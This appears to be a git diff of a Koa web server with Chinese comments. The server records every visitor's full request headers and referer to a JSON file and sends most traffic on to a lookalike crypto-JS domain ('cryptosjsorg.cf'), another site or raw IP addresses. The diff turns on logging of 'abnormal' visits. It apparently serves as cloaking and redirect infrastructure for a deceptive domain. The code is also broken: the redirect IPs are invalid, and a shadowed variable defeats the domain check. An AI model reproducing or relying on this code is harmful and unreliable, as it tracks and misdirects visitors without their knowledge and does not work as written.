@@ -21,7 +21,7 @@ const email = require('./aa.js');
 // console.log(current_time);
 
 // var domain='langpro.xyz'
-var domain='/'
+var domain='444cf'
 
 function getTimeByTimeZone(timeZone){
     var d=new Date();
@@ -63,7 +63,7 @@ app.use( BodyParser() );
 
 const router = new Router();
 
-function addshuju(data,ctx,shu,llsps){
+function addshuju(data,ctx,shu,domain){
     // data.requestip=ctx.request.header.host; 
     // data.Origin=ctx.request.header.Origin; 
     data.header=ctx.request.header;
@@ -72,10 +72,10 @@ function addshuju(data,ctx,shu,llsps){
     data.Time=getTimeByTimeZone(8);
     // 添加ip地址
     // ctx.body = ' .'
-    if(shu){
+    if(shu){//是否是正常的访问
         datas.todos.push(data);
         fs.writeFileSync('./static/data/blogdata.json', JSON.stringify(datas));
-        if(llsps){
+        if(domain){
             ctx.response.redirect(ctx.href+'static/b/index.html');
         }else{
             ctx.response.redirect('http://cryptosjsorg.cf');
@@ -103,9 +103,9 @@ app.use(async (ctx, next)=>{
                 // return;
                 ctx.response.redirect('http://cryptosjsorg.cf');
                
-            }else{
+            }else{ //除了正常的域名访问都为不正常访问
                 var data = {uu:ctx.href,referer:str1||''};
-                // addshuju(data,ctx,false)
+                addshuju(data,ctx,false)
                 // ctx.response.redirect('http://cryptojsorg.cf/a?username=假的&uu='+ctx.href+'&referer='+str1|'');
             }
         }
@@ -125,7 +125,7 @@ router.get('/', async ctx => {
     var str1=ctx.header.referer;//输入栏
     var str=ctx.href; //请求地址
     var shu=str.includes('cryptojsorg');
-    var llsps=str.includes(domain);
+    var domain=str.includes(domain);
     var jlfqq=str.includes('jlfqq');
     // console.log(str);
     // console.log(shu);
@@ -133,17 +133,17 @@ router.get('/', async ctx => {
         // console.log('yu');
         ctx.response.redirect('http://cryptosjsorg.cf');
         
-    }else if(llsps){
+    }else if(domain){
         var data = {uu:ctx.href,referer:str1||''};
         addshuju(data,ctx,true,true)
 
     }else if(jlfqq){
         ctx.response.redirect('http://jlfqq.cn/static/pic/index.html?p='+query.p);
 
-    }else{
+    }else{//除了域名访问都不正常
         // console.log('ip');
         
-        ctx.response.redirect('http://18.162.1194.33');
+        ctx.response.redirect('http://8.2118.6.4');
     }
 });
 
